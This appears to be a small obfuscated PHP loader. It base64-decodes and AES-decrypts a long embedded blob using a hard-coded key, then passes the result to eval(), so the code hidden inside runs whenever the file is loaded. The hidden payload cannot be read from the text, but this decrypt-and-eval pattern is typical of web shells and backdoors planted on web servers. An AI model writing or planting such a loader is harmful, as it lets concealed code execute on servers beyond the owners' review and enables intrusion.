<?php
function e7061($e)
{
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed", "AES-256-CBC", "1122334455667788", 0, "1122334455667788");
	return $n;
}

if (!function_exists('openssl_decrypt')) {
	die('<h2>Function openssl_decrypt() not found !</h2>');
}
// if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
// if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
// $rtv=include_once($keyfile);if($rtv!=1){die("<h2>include: $keyfile not found!</h2>");}
$e7091 = "NS8vWHM4a3BFaXV1VllZSnJob0l2QmdqZ1QwSi8xZ3VCUCt0NTM3cHRLaHA4MDdrRHNoUVFEZWdOTXhTM0U3dFJhdXNSY2c2K3ZrVTdTcnFwWERhdjI3Q2VibTFOeFh2bEtkN0h0OTJ5T1NCd2RmaDlTbXpXK0EvdnV5c3E3WjlEQ2VETUtRNkdERGlZQWE3c2NPaHFUZHFQMmFxaUJWOFBxQVNCVjBwb2hPb2xxUHl1alNzUjVURjlSVzNEUlJwYXB3ZnRVSzZWT0RxempQcUZCQWhucWRVWnZHSE5BczFYNmR6c3hmZDU1cWQ3N3dkK0lNUkM1MnIxZUpCcXBPRUhKK3FDRmNmQlk3UDNYMEpKMitPbVN5TTRSVkQ4Q2F5b2lQREtzOUpYaEtIekJocXRsSW5LM3pWdmp5NHZUR2w1ZG1UODQ3WmVsSERJbU5yajNJK1R1NHVNdkMvN1Z2ZHp1anlmclB6YlNFPQ==";
eval(e7061($e7091));
?>
